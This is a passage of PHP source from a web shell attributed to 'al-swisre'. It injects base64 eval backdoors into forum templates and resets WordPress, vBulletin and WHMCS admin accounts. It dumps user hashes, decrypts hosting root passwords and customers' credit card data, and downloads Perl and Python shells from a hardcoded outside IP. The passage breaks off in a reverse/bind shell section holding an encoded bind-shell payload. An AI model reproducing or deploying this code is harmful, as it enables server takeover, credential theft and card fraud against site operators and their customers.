[ <a href="?sws=ms&op=shm" >Show members Information</a>]
';


}



else if ($secript == 'wp')
{


  echo '
 <div class="cont">
 <div style="text-shadow: 0px 0px 4px #FFFFFF"> <b>Options Wordpress </b><div>
<br />  <br /> <b>
[ <a href="?sws=ms&op=awp"> Change admin </a>]

[ <a href="?sws=ms&op=shwp" >Show members</a>]';


  }


else if ($secript == 'wh'){

  echo '
 <div class="cont">
 <div style="text-shadow: 0px 0px 4px #FFFFFF"> <b>Options Whmcs </b><div>
<br />  <br /> <b>
[ <a href="?sws=ms&op=hroot">roots</a>]
[ <a href="?sws=ms&op=chost"> Clients Hosting Account </a>]
[ <a href="?sws=ms&op=scard" >Cards</a>] <br /><br />
[ <a href="?sws=ms&op=trak" >tickets</a>]
[ <a href="?sws=ms&op=rtrak" >ticket replies</a>]
 [ <a href="?sws=ms&op=sh3"> Search ticket</a>]
[ <a href="?sws=ms&op=cadmin"> Change admin </a>]';


}
else{echo '<div class="cont"> ';}


/////////////// cmd ////////////////////////////////
 echo "<br /><br />

 [ <a href='?sws=ms&op=bkup'> baukup </a>]
 [ <a href='?sws=ms&op=css'> Inject css </a>]
 <br /><br />
<form method='post'>
<textarea rows=\"3\" name=\"sql\">Cmd sql</textarea> <br /><br />
<input type=\"submit\" value=\"SQL\" name='cmd'/>
</form>
<br /><br />
<a style=\" float: right\" href=\"?sws=ms&op=out\" >[ Logout ]</a>";

if (isset($_POST['cmd']))
{

$sql  = $_POST['sql'];

$query =@mysql_query($sql,$con) or die;

if ($query){echo "<br /><br /><center><br /><div style=\"color: #003300;  font-weight: bold\">CMD sql successfully </div>  </center>";} elseif(!$query) {echo "<br /><br /><center><br /><div style=\"color: red;  font-weight: bold\">CMD sql error </div>  </center>";}


}

exit;


}

///////////////////// show cl ///////////////
else if ($_GET['show'] == 'cl')

{





    $host_c =  $_COOKIE['host_mysql'];
    $user_c =  $_COOKIE['user_mysql'];
    $pass_c =  $_COOKIE['pass_mysql'];
    $db_c   =  $_COOKIE['db_mysql'];


    $con = @mysql_connect($host_c,$user_c,$pass_c);
    $sel = @mysql_select_db($db_c);

    $tb = $_GET['tb'];

    $col_sws = mysql_query("SHOW COLUMNS FROM $tb");

    $num2 = mysql_num_rows( $col_sws );
    echo "<div class='tmp'> <table align='center'><td>Columns Name</td><td>Content</td>";
    for( $i2 = 0; $i2 < $num2; $i2++ ){

    $col = mysql_fetch_row($col_sws) ;
    $um_sws =  $col[0];

     echo "<tr><td>$um_sws&nbsp;</td>" ;


     $tit = mysql_query ("SELECT * FROM $tb" );
     while ($row = mysql_fetch_assoc($tit))
     {

      $cont = $row[$um_sws] ;

     echo "<td>$cont</td></tr>" ;


}

;


}




exit;


}









if (isset($_COOKIE['host_mysql'])){

if (!isset($_GET['op'])){

echo " <meta http-equiv=\"refresh\" content=\"0; url=$pg?sws=ms&show=tb\" /> ";


exit;
}


}





else if (!isset($_COOKIE['host_mysql']))

{


if (!isset($host))
{


echo '

<div >

<br /><br /><br />
<pre><form method="POST">
host :<input type="text" name="host" /><br />
user :<input type="text" name="user" /><br />
pass :<input type="text" name="pass" /><br />
db   :<input type="text" name="db" /><br />
<input type="submit" name="login" value="login .."   />
</form></pre>';
exit;}
else
{

$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];


$con = @mysql_connect($host,$user,$pass) ;

$sel = @mysql_select_db($db,$con);

if (!$sel)
{

echo " MYSQL INFOTMATI NOT TREY ";


}

else
{



setcookie( "host_mysql", $host);
setcookie( "user_mysql", $user);
setcookie( "pass_mysql", $pass);
setcookie( "db_mysql", $db);
ob_end_flush();

echo " <meta http-equiv=\"refresh\" content=\"0; url=$pg?sws=ms&show=tb\" /> ";
exit;





}}}




/////////////////////////////////// Options /////////////////////////////////////////

if (isset($_GET['op']))
{

$op = $_GET['op'];

    $host_c =  $_COOKIE['host_mysql'];
    $user_c =  $_COOKIE['user_mysql'];
    $pass_c =  $_COOKIE['pass_mysql'];
    $db_c   =  $_COOKIE['db_mysql'];

    $con3 =@mysql_connect($host_c,$user_c,$pass_c) or die ;
    $sedb3 =@mysql_select_db($db_c,$con3) or die;
    if (!$sedb3){echo "error in mysql connect "; exit;}


      /////// index vb ////////

if ($op == 'in')
{

if (!isset($index)){

echo '
    Your index : <br /><br />
     <form  method="post">

     <textarea rows="7" name="index" cols="40"></textarea>

     <br /><br />
     <input type="submit" value="Update Index" maxlength="30" name="sql" />
     </form> ';
}
else if ($_POST['sql'])
{


$index =$_POST['index'];

$index=str_replace("\'","'",$index);
$crypt  = "{\${eval(base64_decode(\'";
$crypt .= base64_encode("echo \"$index\";");
$crypt .= "\'))}}{\${exit()}}</textarea>";
$sqlindex = "UPDATE `template` SET `template` = '$crypt'" or die;
$query =@ mysql_query($sqlindex);

if ($query)
{
  echo "<center><br /><div style=\"color: #003300;  font-weight: bold\">Updated Index successfully </div>  </center>";
  echo "<a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
  exit;
}
else if (!$query)
{
  echo "<center><br /><div style=\"color: #003300;  font-weight: bold\">Updated Index erorr </div>  </center>";
  echo "<a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
  exit;

}




}










}
/////// shelllll ///////////
else if($op == 'sh')

{



if (!isset($_POST['ch']))
{


echo '
<br /><br /><br />
<form method="post">

<select name="ch">
<option value="faq">Inject shell in faq </option>
<option value="cal">Inject shell in calendar </option>
<option value="sea">Inject shell in search </option>
</select>
<br /><br /><br />
<input type="submit" name="sql" value="Inject shell"  />
</form>



';

} if (isset($_POST['sql'])){

$ch = $_POST['ch'];
$shell = "DQoNCmVjaG8gJzxiPlsgYWwtc3dpc3JlIF0mbmJzcDsmbmJzcDtbIFNhdWRpIHNoZWxsIF08YnI+PGJyPjxicj48L2I+JzsgZWNobyAnPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0idXBsb2FkZXIiIGlkPSJ1cGxvYWRlciI+JzsgZWNobyAnPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIHNpemU9IjUwIj48aW5wdXQgbmFtZT0iX3VwbCIgdHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7IGlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsgaWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpIHsgZWNobyAnPGI+VXBsb2FkIFN1Y2Nlc3MgISEhPC9iPjxicj48YnI+JzsgfSBlbHNlIHsgZWNobyAnPGI+VXBsb2FkIEZhaWwgISEhPC9iPjxicj48YnI+JzsgfSB9IA0KPz4=" ;
$crypt  = "{\${eval(base64_decode(\'";
$crypt .= "$shell";
$crypt .= "\'))}}{\${exit()}}</textarea>";




if ($ch == 'faq'){$sqlfaq="UPDATE template SET template ='".$crypt."' WHERE title ='FAQ'";}

elseif ($ch == 'cal'){$sqlfaq="UPDATE template SET template ='".$crypt."' WHERE title ='CALENDAR'";}

elseif ($ch == 'sea'){$sqlfaq="UPDATE template SET template ='".$crypt."' WHERE title ='search_forums'";}


$query =@ mysql_query($sqlfaq);

if ($query)
{
  echo "<br /><br /><center><br /><div style=\"color: #003300;  font-weight: bold\">Injection has been successfully</div>  </center>";
  echo "<a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
  exit;
}
else if (!$query)
{
  echo "<br /><br /><center><br /><div style=\"color: #003300;  font-weight: bold\">Injection has been erorr !</div>  </center>";
  echo "<a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
  exit;

}


}









}
else if ($op == 'shm')
{





$sql = 'select * from `user`';
$query =@ mysql_query($sql);

if ($query)
{

while ($row = mysql_fetch_assoc($query))
{

echo "
<br /><br /><table cellpadding='4' cellspacing='4' align='center' class='tbm'>
<tr>
       <td>ID :</td>
       <td>user :</td>
       <td>pass :</td>
       <td>salt :</td>
       <td>email :</td>

</tr>

<tr>
       <td>".$row['userid']."</td>
       <td>".$row['username']."</td>
       <td>".$row['password']."</td>
        <td>".$row['salt']."</td>
        <td>".$row['email']."</td>
</tr>

</table>

  ";





 }}

}
else if ($op == 'out')
{

setcookie( "host_mysql", $host,time()-3600);
setcookie( "user_mysql", $user,time()-3600);
setcookie( "pass_mysql", $pass,time()-3600);
setcookie( "db_mysql", $db,time()-3600);
ob_end_flush();


echo " <meta http-equiv=\"refresh\" content=\"0; url=$pg?sws=ms\" /> ";
exit;



}

///////////////////////////////// whmcs ////////////////////////////////////////


else if ($op == 'hroot')
{






if (isset($_POST['viw']))
{

$hash = $_POST['hash'] ;


$query = mysql_query("SELECT * FROM tblservers");

        echo "<div class='tmp'><table cellpadding='5' align='center'>
        hosting roots
        <tr><td>Type</td><td>noc</td><td>Active</td><td>IP Address</td><td>username</td><td>Password</td></tr>";

        while($row = mysql_fetch_array($query)) {

        echo "<tr>
        <td>{$row['type']}</td><td>{$row['noc']}</td><td>{$row['active']}</td><td>{$row['ipaddress']}</td><td>{$row['username']}</td><td>".decrypt($row['password'], $hash)."</td>

        </tr>";
        }
        echo "</table>";


        $query = mysql_query("SELECT * FROM tblhosting where username = 'root' or 'admin' or 'administrator'");
         echo "<table cellpadding='5' align='center'>
         <br /><br />
         Clients roots
        <tr><td>IP Address</td><td>username</td><td>Password</td></tr>";

        while($row = mysql_fetch_array($query)) {

        echo "<tr>
        <td>{$row['dedicatedip']}</td><td>{$row['username']}</td><td>".decrypt($row['password'], $hash)."</td>

        </tr>";
        }
        echo "</table></div>";
        echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
        exit;


}
else
{

echo'<form method="post">
 <br /><br />
encryption hash <br /><br /><input type="text" name="hash" /><br /><br />
<input type="submit" name="viw" value="show"  />

</form>';
exit;





}


}


//////////// domine ////////////

 else if ($op == 'scard')

{

if (isset($_POST['viw']))
{

$hash = $_POST['hash'] ;


$query = mysql_query('select * from `tblclients`') ;
echo "<div class='tmp'><table cellpadding='5' align='center'> ";
while($v = mysql_fetch_array($query)) {
  echo "
  <tr><td>cardtype</td>
  <td>id</td>
  <td>firstname</td>
  <td>lastname</td>
  <td>email</td>
  <td>city</td>
  <td>ciuntry</td>
  <td>address1</td>
  <td>lastlogin</td>
  <td>phonenumber</td>
  <td>datecreated</td>
  <td>cardnum</td>
  <td>startdate</td>
  <td>expdate</td>
  </tr>";
    echo "<tr>

    <td>{$v['cardtype']}</td>
    <td>{$v['id']}</td>
    <td>{$v['firstname']}</td>
    <td>{$v['lastname']}</td>
    <td>{$v['email']}</td>
    <td>{$v['city']}</td>
    <td>{$v['ciuntry']}</td>
    <td>{$v['address1']}</td>
    <td>{$v['lastlogin']}</td>
    <td>{$v['phonenumber']}</td>
    <td>{$v['datecreated']}</td>
    <td>".decrypt ($v['cardnum'], $hash)."</td>
    <td>".decrypt ($v['startdate'], $hash)."</td>
    <td>".decrypt ($v['expdate'], $hash)."</td>
     </tr></div></table>";
     echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
     exit;

 }
}else
{

echo'<form method="post">
 <br /><br />
encryption hash <br /><br /><input type="text" name="hash" /><br /><br />
<input type="submit" name="viw" value="show"  />

</form>';
exit;





}







}

 else if ($op == 'chost')

{



if (isset($_POST['viw']))
{

$hash = $_POST['hash'] ;

$query = mysql_query("SELECT * FROM tblhosting");
    echo "<div class='tmp'><table cellpadding='5' align='center'>
    <tr><td>domain</td><td>Username</td><td>Pass</td><td>IP Address</td></tr>";
    while($r = mysql_fetch_array($query)) {
    echo "<tr><td>{$r['domain']}</td><td>{$r['username']}</td>
    <td>".decrypt ($r['password'], $hash)."</td><td>{$r['dedicatedip']}</td></tr>";
    }
    echo "</table></div>";
   echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";

    exit;



}
else
{

echo'<form method="post">
 <br /><br />
encryption hash <br /><br /><input type="text" name="hash" /><br /><br />
<input type="submit" name="viw" value="show"  />

</form>';
exit;





}







}



else if ($op == 'cadmin')

{



if (isset($_POST['viw']))
{

$pass = md5($_POST['pass']);
$user = $_POST['user'];



$query =@mysql_query("UPDATE `tbladmins` SET `username` ='".$user."' WHERE ID = 1");
$query =@mysql_query("UPDATE `tbladmins` SET `password` ='".$pass."' WHERE ID = 1");

if ($query)
{
  echo "<center><br /><div style=\"color: #003300;  font-weight: bold\">Updated admin successfully </div>  </center>";
          echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";

  exit;
}

else if (!$query)
{
  echo "<center><br /><div style=\"color: red;  font-weight: bold\">Updated admin erorr </div>  </center>";
          echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";

  exit;

}







}
else
{

echo'<form method="post">
 <br /><br />
user : <input type="text" name="user" /><br /><br />
pass : <input type="text" name="pass" /><br /><br />
<input type="submit" name="viw" value="update"  />

</form>';


exit;





}
}



else if ($op == 'trak')

{

$page = $_GET['page'];
$numpr = 30;
if(!$page){$page = 0;}
$sql0 = mysql_query("Select * from tbltickets");
$num_r0s = mysql_num_rows($sql0);


$sql = mysql_query("Select * from tbltickets order by id desc limit $page,$numpr");

$ap = 1;
echo "<br /><br /><div>Page  : ";
for ($s = 0 ; $s < $num_r0s; $s = $s+$numpr )
{

if ($page != $s) { echo "<a class='hr' href='$pg?sws=ms&op=trak&page=$s'>$ap</a>";}
else {echo "<a class='hr2' href='$pg?sws=ms&op=trak&page=$s'>$ap</a>";}


$ap ++;

}

echo "</div><br />";


while ($r3o = mysql_fetch_assoc($sql))
{

$email   = $r3o['email'];
$date    = $r3o['date'];
$title   = $r3o['title'];
$message = $r3o['message'];
echo "<div class='tmp'><table cellpadding='0' align='center' width='70%' >";

echo "<tr><td>email : $email </td><td>date : $date </td><td>title : $title</td></tr>
<tr > <td>message</td> <td colspan='3'>$message</td><br /><br /></tr>";
echo "</table></div>";
echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
exit;



}

}


else if ($op == 'rtrak')

{

$page = $_GET['page'];
$numpr = 25;
if(!$page){$page = 0;}
$sql0 = mysql_query("Select * from tblticketreplies");
$num_r0s = mysql_num_rows($sql0);


$sql = mysql_query("Select * from tblticketreplies order by id desc limit $page,$numpr");

$ap = 1;
echo "<br /><br /><div>Page  : ";
for ($s = 0 ; $s < $num_r0s; $s = $s+$numpr )
{

if ($page != $s) { echo "<a class='hr' href='$pg?sws=ms&op=trak&page=$s'>$ap</a>";}
else {echo "<a class='hr2' href='$pg?sws=ms&op=trak&page=$s'>$ap</a>";}


$ap ++;

}

echo "</div><br />";


while ($r3o = mysql_fetch_assoc($sql))
{

$email   = $r3o['email'];
$date    = $r3o['date'];
$message = $r3o['message'];
echo "<div class='tmp'><table cellpadding='0' align='center' width='70%' >";

echo "<tr><td>email : $email </td><td>date : $date </td></tr>
<tr > <td>message</td> <td colspan='2'>$message</td><br /><br /></tr>";
echo "</table></div>";
echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
exit;



}

}


/////////////////////////////////// backup //////////////////////////

else if ($op == 'bkup')
{






if (isset($_POST['viw']))
{



$path = $_POST['path'];

$domp = @backup_tables($path,$host_c,$user_c,$pass_c,$db_c);


  echo "<center><br /><div style=\"color: #003300;  font-weight: bold\">Create backup successfully <br /><br /> $path</div>  </center>";
  echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
  exit;






}
else
{

echo'<form method="post">
 <br /><br />
path backup <br /><br /><input type="text" name="path" /><br /><br />
<input type="submit" name="viw" value="Create"  />

</form>';
exit;





}


}





 else if ($op == 'sh3')

{

if (isset($_POST['viw']))
{

$string = $_POST['string'];
$ch = $_POST['ch'];

if ($ch == 'trs')
{
   $sql4 = @mysql_query("Select * from tblticketreplies WHERE `message` LIKE '%$string%'");

}

else if($ch == 'tr')
  {
   $sql4 = @mysql_query("Select * from tbltickets WHERE `message` LIKE '%$string%'  ");
  }




$nu0 = @mysql_num_rows($sql4);
if ($nu0 == 0){echo "No result"; exit;}

while ($r33o = mysql_fetch_assoc($sql4))
{


$date    = $r33o['date'];
$title   = $r33o['title'];
$message = $r33o['message'];
echo "<div class='tmp'><table cellpadding='0' align='center' width='70%' >";

echo "<tr><td>email : $email </td><td>date : $date </td><td>title : $title</td></tr>
<tr > <td>message</td> <td colspan='3'>$message</td><br /><br /></tr>";
echo "</table></div>";
exit;



}





}
else
{

echo'<form method="post">
 <br /><br />
search : <input type="text" name="string" />&nbsp;&nbsp;<select name="ch">
<option value="tr">ticket</option>
<option value="trs">ticket replies</option>
</select> <br /><br />
<input type="submit" name="viw" value="search"  />

</form>';
exit;





}
}




else if ($op == 'sh3')

{

if (isset($_POST['viw']))
{

$string = $_POST['string'];
$ch = $_POST['ch'];

if ($ch == 'trs')
{
   $sql4 = @mysql_query("Select * from tblticketreplies WHERE `message` LIKE '%$string%'");

}

else if($ch == 'tr')
  {
   $sql4 = @mysql_query("Select * from tbltickets WHERE `message` LIKE '%$string%'  ");
  }




$nu0 = @mysql_num_rows($sql4);
if ($nu0 == 0){echo "No result"; exit;}

while ($r33o = @mysql_fetch_assoc($sql4))
{


$date    = $r33o['date'];
$title   = $r33o['title'];
$message = $r33o['message'];
echo "<div class='tmp'><table cellpadding='0' align='center' width='70%' >";

echo "<tr><td>email : $email </td><td>date : $date </td><td>title : $title</td></tr>
<tr > <td>message</td> <td colspan='3'>$message</td><br /><br /></tr>";
echo "</table></div>";




}





}
else
{

echo'<form method="post">
 <br /><br />
search : <input type="text" name="string" />&nbsp;&nbsp;<select name="ch">
<option value="tr">ticket</option>
<option value="trs">ticket replies</option>
</select> <br /><br />
<input type="submit" name="viw" value="search"  />

</form>';

exit;




}
}


else if ($op == 'css')

{

if (isset($_POST['viw']))
{
   $index = $_POST['index'];
   $seh = $_POST['string'];
   $rs = search($seh);
    if(count($rs) == 0){echo 'No result';exit;}
    foreach ($rs as $info)
    {

   $table = $info['table'];
   $column = $info['column'];

   echo "table :  $table<br /><br />

   column : $column
   <form method=\"post\">
 <br /><br />
<input type='submit' name='v' value=\"inject\"  />
            <input type='hidden' name=\"index\" value=$index>
            <input type=\"hidden\" name=\"table\" value='$table'>
            <input type=\"hidden\" name=\"column\" value='$column' >
            <input type=\"hidden\" name=\"shearc\" value='$seh'>
</form>
";

exit;







    }







}
else
{

echo'<form method="post">
 <br /><br />
search : <input type="text" name="string" />
<br />
Css url : <input type="text" name="index"><br /><br />
<input type="submit" name="viw" value="search"  />

</form>';
exit;





}

   if (isset($_POST['v']))
   {

   $seh = $_POST['shearc'] ;
   $table = $_POST['table'];
   $column = $_POST['column'] ;
   $rlcss = $_POST['index'] ;

     $data = "<head><link href=$rlcss rel=stylesheet></head>";

    $query = mysql_query("UPDATE ".$table." SET ".$column." ='$data' WHERE `$column` LIKE '%$seh%'") or die(mysql_error());
    if($query){
        echo "<center><br /><div style=\"color: #003300;  font-weight: bold\">Injection has been successfully</div>  </center>";
        echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
        exit;
    }else{
        echo '<center><br /><div style=\"color: #003300;  font-weight: bold\"> Injection erorr</div>';


        exit;
    }


   }


}


else if ($op == 'awp')

{



if (isset($_POST['viw']))
{

$pass = $_POST['pass'];
$user = $_POST['user'];


$crypt = crypt($pass);

$query =@mysql_query("UPDATE `wp_users` SET `user_login` ='".$user."' WHERE ID = 1") or die;
$query =@mysql_query("UPDATE `wp_users` SET `user_pass` ='".$crypt."' WHERE ID = 1") or die;

if ($query)
{
  echo "<center><br /><div style=\"color: #003300;  font-weight: bold\">Updated admin successfully </div>  </center>";
  echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
  exit;
}
else if (!$query)
{
  echo "<center><br /><div style=\"color: red;  font-weight: bold\">Updated admin erorr </div>  </center>";
  echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
  exit;

}







}
else
{

echo'<form method="post">
 <br /><br />
user : <input type="text" name="user" /><br /><br />
pass : <input type="text" name="pass" /><br /><br />
<input type="submit" name="viw" value="update"  />

</form>';





}
}


else if ($op == 'shwp')
{





$sql = 'select * from `wp_users`';
$query =@ mysql_query($sql);

if ($query)
{

while ($row = mysql_fetch_assoc($query))
{

echo "
<br /><br /><table cellpadding='4' cellspacing='4' align='center' class='tbm'>
<tr>
       <td>ID :</td>
       <td>user :</td>
       <td>pass :</td>
       <td>email :</td>

</tr>


<tr>
       <td>".$row['ID']."</td>
       <td>".$row['user_login']."</td>
       <td>".$row['user_pass']."</td>
        <td>".$row['user_email']."</td>
</tr>



</table>


  ";

  echo "<br /><a href='$pg?sws=ms&show=tb'>[ Back ]</a>";
  exit;





 }}

}



}

break;



/////////////////////////////////////////////// info   ///////////////////////////////////
case 'info':

$sws = 'al-swisre' ;
if ($sws != 'al-swisre'){echo "Coded by al-swisre"; exit;}

if(strlen($dir)>1 && $dir[1]==":")
$os = "Windows";
else $os = "Linux";
$read = @file_get_contents("http://s92443018.onlinehome.us/cgi-bin/host.php?$ips");
$r3ad = @file_get_contents("http://aruljohn.com/track.pl?host=$ips") ;
$ipnet = @findit($read,"<td nowrap>IP-Network</td><td>&nbsp;</td><td nowrap>","</td>");
$ipb = @findit($read,"<td nowrap>IP-Network-Block</td><td>&nbsp;</td><td nowrap>","</td>");
$hostname = @findit($read,"Hostname:","<br>");
$isp = @findit($r3ad,"ISP</td><td>","</td>");






echo "<div class='info'><table cellpadding='0' align='center' width='60%' >
<tr><td colspan='2'>Information Server</td><tr>
<tr><td>Hostname</td><td>".$hostname."</td></tr>
<tr><td>ISP</td><td>".$isp."</td></tr>
<tr><td>IP-Network</td><td>".$ipnet."</td></tr>
<tr><td>IP-Network-Block</td><td>".$ipb."</td></tr>
<tr><td>Safe Mode</td><td>".(($safe_mode)?(" &nbsp;: <b><font color=red>ON</font></b>"):("<b><font color=green>OFF</font></b>"))."</td></tr>
<tr><td>System</td><td>".$os."</td></tr>
<tr><td>PHP Version </td><td>".phpversion()."</td></tr>
<tr><td>Zend Version </td><td>".@zend_version()."</td></tr>
<tr><td>Magic_Quotes </td><td>". magicQouts()."</td></tr>
<tr><td>Curl </td><td>".Curl()."</td></tr>
<tr><td>Register Globals </td><td>".RegisterGlobals()."</td></tr>
<tr><td>Open Basedir </td><td>".openBaseDir()."</td></tr>
<tr><td>Gzip </td><td>".Gzip()."</td></tr>
<tr><td>Free Space </td><td>".HardSize(disk_free_space('/'))."</td></tr>
<tr><td>Total Space </td><td>".HardSize(disk_total_space("/"))."</td></tr>
<tr><td>MySQL</td><td>".MySQL2()."</td></tr>
<tr><td>MsSQL</td><td>".MsSQL()." </td></tr>
<tr><td>PostgreSQL</td><td>".PostgreSQL()."</td> </tr>
<tr><td>Oracle</td><td>".Oracle()."</td></tr>";

exit;



















break;


///////////////////////////////// bypass ///////////////////////

case 'byp':


echo '<div class="cont3">
[ <a href="?sws=byp"> bypass </a>]

[<a href="?sws=byp&op=shell&sh=perl">Make Shell Perl</a>]

[<a href="?sws=byp&op=shell&sh=py"> Make Shell Python </a>]
[<a href="?sws=byp&op=g3t"> Get file </a>]

</div><br /><br />'  ;

$op = $_GET['op'];

if(@$_GET['dir']){
    $dir = $_GET['dir'];
    if($dir != 'nullz') $dir = @cleandir($dir);
}

if ($op == 'shell')
{


$sh = $_GET['sh'];
////////////////////////// perl or python //////////////////////

if (!isset($_POST['get']))
{



echo "<form method='post'>
Path shell : <input type='text' name='path'  value='".$dir."/cgi-bin' size='30'/><br /><br />
name shell : <input type='text' name='name'  value='shell.sa' size='25' /><br /><br />
htaccess   :<br /><br /><textarea name='htx'>AddHandler cgi-script .sa</textarea>
<br /><br />
<input type='submit' name='get' value='Make' /></form>";

}else {


$path = $_POST['path'];
$name = $_POST['name'];
$htac = $_POST['htx'];

if (isset($htac))
{

$fop = @fopen("$path/.htaccess", 'w');

@fwrite($fop,$htac);

@fclose($fop);

}

$rpath = $path."/".$name;


if ($sh == 'perl')
{
    $url_shell  = 'http://64.15.137.117/~google/cgi-bin/perl.zip';   /// perl
    $path = $dir."/".$d3r."/"."sa.pl";

}
else if($sh == 'py')

{

    $url_shell  = 'http://64.15.137.117/~google/cgi-bin/python.zip';  /// python
    $path = $dir."/".$d3r."/"."sa.py";


}

//// get shell///


    $fp = @fopen($rpath, 'w');

    $ch = @curl_init($url_shell);
    @curl_setopt($ch, CURLOPT_FILE, $fp);

    $data = @curl_exec($ch);

    @curl_close($ch);
    @fclose($fp);



if (!is_file($rpath))
{



    $ch = @curl_init($url_shell);
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $data = @curl_exec($ch);

    @curl_close($ch);

    @file_put_contents($rpath, $data);

}elseif (@is_file($rpath)) {

$ch =@chmod($rpath,0755);

echo "Sh3ll have been created<br /><br />
$rpath";



}else {echo "error";}

}
}
///////////////////// get file ////////////////////
elseif ($op == 'g3t')
{

if (!isset($_POST['get']))
{


echo 'Get file<br /><br /><br />
<form method="post">
Url file : <input type="text" name="file" />&nbsp;&nbsp;
to : <input type="text" name="path" value="'.$dir.'/file.php"  /><br /><br />
<input type="submit" name="get" value="Get" />

</form>' ;exit;







}
else
{

$url_shell = $_POST['file'];
$path = $_POST['path'];



    $fp = @fopen($path, 'w');

    $ch = @curl_init($url_shell);
    @curl_setopt($ch, CURLOPT_FILE, $fp);

    $data = @curl_exec($ch);

    @curl_close($ch);
    @fclose($fp);



if (!is_file($path))
{



    $ch = @curl_init($url_shell);
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $data = @curl_exec($ch);

    @curl_close($ch);

    @file_put_contents($path, $data);

}elseif (@is_file($path)) {


echo "got the file successfully<br /><br />
$path"; exit;



}else {echo "error";}



}





}else if(!isset($op)) {}







break;

/////////////////////////////////////////////////// Connect Back ////////////////////////////////////

case 'con':



if (!isset($_POST['con']))
{
echo "";

echo "
<div class='conn'><table cellpadding='0' align='center'>
<br />
<form method=\"post\">
<tr><td>
<br />Back Connect :<br /> <br />
Ip : <input type=\"text\" name=\"ip\" value='". $_SERVER['REMOTE_ADDR'] ."' />&nbsp;&nbsp;&nbsp;
Port : <input type=\"text\" name=\"port\" />&nbsp;&nbsp;&nbsp;
<select name=\"op\">
<option value=\"php\">PHP</option>
<option value=\"perl\">Perl</option>
<option value=\"python\">Python</option>
</select>&nbsp;&nbsp;&nbsp;<input type=\"submit\" name=\"con\" value=\"Connect\" /><br /> <br /><br /></td></tr>
<tr><td><br />Bind Connect :<br /><br />Port : <input type=\"text\" name=\"bind_port\" /> <select name=\"op\">
<option value=\"perl\">Perl</option>
<option value=\"python\">Python</option>
</select>
<input type=\"submit\" name=\"con\" value=\"Connect bind\" /> <br /><br /> <br /></td></tr>


</form>";

exit;

}else
{

if ($_POST['con'] == 'Connect') {



$ip = $_POST['ip'] ;
$port = $_POST['port'] ;
$op = $_POST['op'] ;

$bind_perl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
